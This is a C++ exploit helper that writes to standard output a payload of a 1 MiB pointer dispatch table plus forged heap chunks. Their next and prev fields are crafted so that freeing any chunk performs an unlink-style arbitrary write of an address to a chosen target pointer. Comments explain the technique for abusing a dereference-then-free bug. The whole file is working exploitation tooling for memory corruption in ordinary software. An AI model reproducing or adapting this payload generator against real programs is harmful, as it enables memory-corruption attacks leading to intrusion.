/* This tool is useful in cases where an arbitrary pointer is dereferenced and
   the result free'd. If there is no usable area in memory where arbitrary data
   can be loaded at a fixed address, we can use the dereference operation to
   get a known base point.
   Depending on which pointer lands at dispatch_start in memory, the target
   contains the necessary adjustments for the offset:

    +---[dispatch + 0]
    |+--[dispatch + 4]
    ||+-[dispatch + 8]
    |||+[dispatch + C]
	||||...
    +--|[chunk + 0]----+
     +-|[chunk + 4]---+|
      +|[chunk + 8]--+||
       +[chunk + C]-+|||
        ...         ||||
        [data]------++++

   If [dispatch + 4] ends up being dereferenced, we know that the buffer was
   loaded at a -4 byte offset relative to dispatch_start. This means we can
   construct a dispatch table so that no matter which pointer in the dispatch
   table ends up at dispatch_start and gets dereferenced, it ends up freeing
   a chunk that contains the correct absolute addresses.
   The dispatch table has a size of 1 MiB by default, which results
   in 4 MiB of generated data.

   We use this to write the address of the data after the generated data
   at target_ptr. The second word after target_ptr must not be zero. */

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>

struct chunk {
	uint32_t next;
	uint32_t prev;
	uint32_t free;
	/* Instead of using full chunks like
	   [next]
	   [prev]
	   [free]
	   [pool]
	   [next]
	   [prev]
	   [free]
	   [pool]
	   ...

	   we can save four bytes per chunk by using the next value of
	   the next chunk as pool value:
	   [next]
	   [prev]
	   [free]
	   [pool|next]
	        [prev]
	        [free]
	        [pool|next]
	              ...
	uint32_t pool;*/
} __attribute__((packed));

int main(int argc, char *argv[])
{
	if(argc != 3)
	{
		fprintf(stderr, "Usage: %s target_ptr dispatch_start\n", argv[0]);
		return 1;
	}

	uint32_t target_ptr = strtol(argv[1], nullptr, 0);
	uint32_t dispatch_start = strtol(argv[2], nullptr, 0);
	uint32_t dispatch_end = dispatch_start + 1024*1024;
	uint32_t dispatch_indices = (dispatch_end - dispatch_start) / 4;

	uint32_t chunk_ptr = dispatch_end;
	for(uint32_t dispatch_index = 0; dispatch_index < dispatch_indices; ++dispatch_index, chunk_ptr += sizeof(chunk) - 4)
	{
		uint32_t pointer = chunk_ptr + 0x10;
		write(1, &pointer, 4);
	}

	uint32_t chunks_end = dispatch_end + sizeof(chunk) * dispatch_indices;
	for(uint32_t dispatch_index = 0; dispatch_index < dispatch_indices; ++dispatch_index)
	{
		uint32_t local_chunks_end = chunks_end - dispatch_index * 4;
		chunk c;
		c.next = local_chunks_end;
		c.prev = target_ptr;
		c.free = 0;
		/*c.pool = 0x13A00000; // Area of zeros */

		write(1, &c, sizeof(c));
	}
}
